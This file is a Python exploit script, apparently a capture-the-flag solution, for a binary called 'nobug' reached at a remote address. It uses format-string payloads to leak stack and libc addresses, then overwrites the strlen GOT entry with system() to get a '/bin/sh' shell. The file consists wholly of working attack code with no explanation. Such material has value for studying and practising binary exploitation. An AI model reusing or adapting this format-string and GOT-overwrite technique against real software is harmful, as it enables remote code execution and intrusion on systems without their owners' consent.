from zio import *
import base64

target = './nobug'
target = ('180.76.178.48', 8888)


def do_fmt(io, fmt):
    io.writeline(base64.encodestring(fmt))
    d = io.readline().strip()
    io.readline()
    return d


def write_any(io):
    d1 = do_fmt(io, '%31$p')
    argv0 = int(d1.strip('\n'), 16)
    d2 = do_fmt(io, '%67$p')
    path = int(d2.strip('\n'), 16)
    print hex(path)

    path = (path + 3) / 4 * 4
    print hex(path)

    index3 = (path - argv0) / 4 + 67

    strlen_got = 0x0804A030

    addr = strlen_got

    for i in range(4):
        do_fmt(io, '%%%dc%%31$hhn' % ((path + i) & 0xff))
        k = ((addr >> (i * 8)) & 0xff)
        if k != 0:
            do_fmt(io, '%%%dc%%67$hhn' % k)
        else:
            do_fmt(io, '%%67$hhn')

    addr = strlen_got + 2
    for i in range(4):
        do_fmt(io, '%%%dc%%31$hhn' % ((path + 4 + i) & 0xff))
        k = ((addr >> (i * 8)) & 0xff)
        if k != 0:
            do_fmt(io, '%%%dc%%67$hhn' % k)
        else:
            do_fmt(io, '%%67$hhn')

    d = do_fmt(io, "%29$p")
    libc_main = int(d, 16)
    print hex(libc_main)

    lib_base = libc_main - 0x00019A63
    system = lib_base + 0x0003FCD0
    systemlow = system&0xffff
    systemhigh = (system>>16)&0xffff
    do_fmt(io, "%%%dc%%%d$hn%%%dc%%%d$hn" %(systemlow, index3, systemhigh-systemlow, index3+1))

    io.writeline('/bin/sh')

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))

    write_any(io)

    io.interact()

exp(target)

